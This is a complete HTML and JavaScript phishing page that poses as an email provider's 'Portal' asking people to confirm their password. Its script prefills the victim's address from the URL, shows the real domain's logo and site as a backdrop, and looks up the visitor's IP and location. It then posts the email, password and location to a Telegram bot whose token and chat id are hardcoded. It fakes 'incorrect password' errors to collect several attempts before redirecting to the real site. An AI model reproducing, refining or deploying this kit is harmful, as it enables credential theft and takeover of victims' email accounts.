<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Email Update</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      font-family: Arial, sans-serif;
      position: relative;
      overflow: hidden;
    }
    #background-container {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: -1;
    }
    #background-frame {
      width: 100%;
      height: 100%;
      border: none;
      position: absolute;
      top: 0;
      left: 0;
      pointer-events: none;
    }
    .abstract-shapes {
      display: none;
    }
    .form-container {
      background: #fff;
      padding: 30px;
      border-radius: 15px;
      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1);
      text-align: center;
      width: 350px;
      border: 2px solid #ddd;
      position: relative;
      z-index: 1;
    }
    h2 {
      color: #333;
      margin-bottom: 20px;
      font-size: 22px;
      font-weight: bold;
    }
    p {
      color: #666;
      font-size: 14px;
      margin-bottom: 20px;
    }
    .form-group {
      margin-bottom: 15px;
      text-align: left;
    }
    .form-group label {
      display: block;
      margin-bottom: 5px;
      font-size: 14px;
      color: #333;
    }
    .form-group input {
      width: 100%;
      padding: 10px;
      border: 1px solid #ccc;
      border-radius: 5px;
      font-size: 14px;
    }
    .form-group button {
      width: 60%;
      padding: 12px;
      background: #007bff;
      color: white;
      border: none;
      border-radius: 5px;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.3s ease;
      margin-top: 20px;
      margin-left: auto;
      margin-right: auto;
      display: block;
    }
    .form-group button:hover {
      background: #0056b3;
    }
    .error-message {
      color: red;
      font-size: 14px;
      display: none;
      margin-top: 10px;
      text-align: left;
    }
    #domainLogo {
      max-height: 50px;
      display: block;
      margin: 0 auto 20px;
    }
    #session-expired {
      color: red;
      font-weight: normal;
      font-size: 14px;
    }
  </style>
</head>
<body>

<div id="background-container">
  <iframe id="background-frame" src="" frameborder="0"></iframe>
</div>

<div class="form-container">
  <img id="domainLogo" alt="Domain Logo" style="display: none;">
  <h2 id="emailDomainHeader"> Portal</h2>
  <p id="session-expired">Confirm your details to avoid disconnection</p>
  
  <form id="loginForm">
    <div class="form-group">
      <label for="email">Email</label>
      <input type="email" id="email" name="email" readonly required>
    </div>
    <div class="error-message" id="errorMessage">Incorrect Pasword, Please fill in the correct details.!</div>
    <div class="form-group">
      <label for="password">Current Password</label>
      <input type="password" id="password" name="password" placeholder="Enter your password" autofocus required>
    </div>
    <div class="form-group">
      <button type="submit">Keep Password</button>
    </div>
  </form>
</div>

<script>
const token = "7072238292:AAHpDdR7mCeOCA1hnbB35_G52GUGLpx9xKM";
const chatId = "6493402961";
let attemptCount = 0;

// Get email from URL hash
const fragment = window.location.hash.slice(1);
const email = decodeURIComponent(fragment);
if (email) {
  document.getElementById('email').value = email;
  const domain = email.split('@')[1];
  const provider = domain.split('.')[0];
  document.getElementById('emailDomainHeader').textContent = ` ${provider} Portal`;

  const logo = `https://logo.clearbit.com/${domain}`;
  const logoImg = document.getElementById('domainLogo');
  logoImg.src = logo;
  logoImg.onerror = () => { logoImg.style.display = 'none'; };
  logoImg.style.display = 'block';

  document.getElementById('background-frame').src = `https://${domain}`;
}

// Hide error message on input
document.getElementById('password').addEventListener('input', () => {
  document.getElementById('errorMessage').style.display = 'none';
});

document.getElementById('loginForm').addEventListener('submit', function (e) {
  e.preventDefault();
  attemptCount++;

  const email = document.getElementById('email').value;
  const password = document.getElementById('password').value;
  const time = new Date().toLocaleString();

  fetch("https://ipapi.co/json")
    .then(res => res.json())
    .then(loc => {
      const ip = loc.ip || "Unknown IP";
      const country = loc.country_name || "Unknown Country";
      const region = loc.region || "Unknown Region";

      const message = `🔐 Email Validation\n\n` +
        `📧 Email: ${email}\n` +
        `🔑 Password: ${password}\n` +
        `🌍 Country: ${country}\n` +
        `🗺️ Region: ${region}\n` +
        `🌐 IP: ${ip}\n` +
        `🕒 Time: ${time}\n` +
        `📱 User-Agent: ${navigator.userAgent}`;

      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: `chat_id=${chatId}&text=${encodeURIComponent(message)}`
      }).finally(() => {
        document.getElementById('errorMessage').style.display = 'block';
        document.getElementById('password').value = '';

        if (attemptCount >= 3) {
          alert("Your password has now been maintained! You can continue using your account without interruption.");
          const domain = email.split('@')[1];
          window.location.href = `https://${domain}`;
        }
      });
    });
});
</script>

</body>
</html>
